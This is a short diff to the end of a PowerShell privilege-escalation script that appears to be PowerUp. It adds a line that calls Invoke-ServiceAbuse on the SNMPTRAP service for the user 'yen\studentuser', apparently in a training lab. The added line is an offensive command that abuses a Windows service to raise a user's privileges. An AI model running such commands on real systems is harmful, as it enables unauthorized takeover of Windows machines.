@@ -4989,3 +4989,5 @@ Set-Alias Get-CurrentUserTokenGroupSid Get-ProcessTokenGroup
 Set-Alias Invoke-AllChecks Invoke-PrivescAudit
 Invoke-AllChecks
 Invoke-ServiceAbuse -Name 'SNMPTRAP'
+Invoke-ServiceAbuse -Name 'SNMPTRAP' -UserName 'yen\studentuser' -Verbose
+
